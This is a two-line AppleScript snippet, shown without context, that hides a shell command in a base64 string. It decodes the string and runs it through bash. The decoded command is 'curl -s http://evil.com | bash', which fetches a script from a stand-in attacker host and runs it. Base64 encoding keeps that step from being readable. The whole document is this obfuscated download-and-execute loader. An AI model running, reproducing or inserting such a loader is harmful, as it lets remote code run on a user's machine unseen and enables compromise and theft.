set payload to "Y3VybCAtcyBodHRwOi8vZXZpbC5jb20gfCBiYXNo"
do shell script "echo " & payload & " | base64 -D | bash"
